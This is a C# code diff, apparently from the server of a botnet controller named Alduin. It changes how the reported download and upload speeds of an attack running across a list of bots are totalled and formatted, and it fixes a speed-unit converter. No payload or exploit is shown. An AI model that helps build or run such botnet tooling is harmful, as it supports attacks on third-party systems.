@@ -36,13 +36,15 @@ namespace Alduin.Server.Services
                 CommandResponseModel[] response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(method));
                 float TotalDownloadSpeed = 0;
                 float TotalUploadSpeed = 0;
+                var msg = "";
                 for (var i = 0; i < response.Length; i++)
                 {
                    string[] data = response[i].Message.Split('/');
                     TotalDownloadSpeed += float.Parse(data[0], CultureInfo.InvariantCulture.NumberFormat);
                     TotalUploadSpeed += float.Parse(data[1], CultureInfo.InvariantCulture.NumberFormat);
+                    msg = data[2];
                 }
-                return "DownloadSpeed: " + SpeedConverter(TotalDownloadSpeed) + " || UploadSpeed: " + SpeedConverter(TotalUploadSpeed);
+                return "DownloadSpeed: " + SpeedConverter(TotalDownloadSpeed) + " || UploadSpeed: " + SpeedConverter(TotalUploadSpeed) + " || " + msg;
             }
             catch {
                 return "Attack not running";
@@ -54,13 +56,13 @@ namespace Alduin.Server.Services
         {
             string[] unit = {"Byte/s", "Kbyte/s", "Mbyte/s", "Gbyte/s", "Tbyte/s"};
             int numerate = 0;
-            float calculatedValue = 0;
-            for (var i = 1024; i / speed == 0; i *= 1024)
+            float calculatedValue = speed;
+            for (var i = 1024; (speed / i) > 1; i *= 1024)
             {
                 numerate++;
                 calculatedValue = speed / i;
             }
-            return calculatedValue + " " + unit[numerate];
+            return Math.Round((Decimal)calculatedValue, 2, MidpointRounding.AwayFromZero) + " " + unit[numerate];
         }
     }
 }
